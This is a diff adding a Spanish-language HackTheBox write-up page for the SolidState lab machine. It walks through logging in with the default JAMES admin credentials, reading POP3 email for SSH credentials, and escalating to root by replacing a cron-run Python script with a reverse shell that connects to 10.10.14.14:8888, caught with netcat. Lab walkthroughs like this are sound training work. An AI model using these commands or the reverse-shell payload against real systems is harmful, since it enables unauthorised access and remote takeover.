@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - SolidState | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-success fs-6">Medium</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">JAMES</span>
+        <span class="badge bg-secondary">POP3</span>
+        <span class="badge bg-secondary">Email</span>
+        <span class="badge bg-secondary">Cron</span>
+        <span class="badge bg-secondary">Python</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">SolidState</h1>
+      <p class="text-secondary mb-3">JAMES Mail Admin con creds por defecto; lectura de emails POP3 para obtener SSH creds; escalada via cron Python.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">telnet</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p 25,22,4555,110,119,80 -Pn -n 10.10.10.51 -oN targeted</code></pre>
+      </div><img src="img/htb-solidstate/153836.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-envelope"></i> Puerto 4555 - JAMES Admin</h4>
+      <p class="text-secondary">JAMES Remote Administration Tool con credenciales por defecto root:root:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>telnet 10.10.10.51 4555
+# Login: root / Password: root
+listusers
+setpassword mindy mindy</code></pre>
+      </div><p class="text-secondary">Reseteamos la contrasena de mindy y leemos sus emails via POP3:</p>
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-envelope"></i> Puerto 110 - POP3 - Credenciales SSH</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>telnet 10.10.10.51 110
+user mindy
+pass mindy
+list
+retr 2</code></pre>
+      </div><div class="code-block mb-3"><pre><code>username: mindy
+pass: P@55W0rd1!2@</code></pre></div><div class="code-block mb-3"><pre><code>ssh mindy@10.10.10.51
+cat /home/mindy/user.txt</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada - Cron + tmp.py</h4>
+      <p class="text-secondary">Usando procmon.sh identificamos que /opt/tmp.py se ejecuta periodicamente como root:</p>
+      <div class="code-block mb-3"><pre><code># Editamos /opt/tmp.py con reverse shell:
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.14",8888))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])</code></pre></div><div class="code-block mb-3"><pre><code>nc -lvp 8888
+cat /root/root.txt</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>JAMES Mail Server tiene credenciales por defecto (root:root) en el puerto de administracion.</li>
+<li>Los emails internos frecuentemente contienen credenciales de acceso para nuevos empleados.</li>
+<li>Los scripts Python en /opt ejecutados por cron como root son vectores clasicos de escalada.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
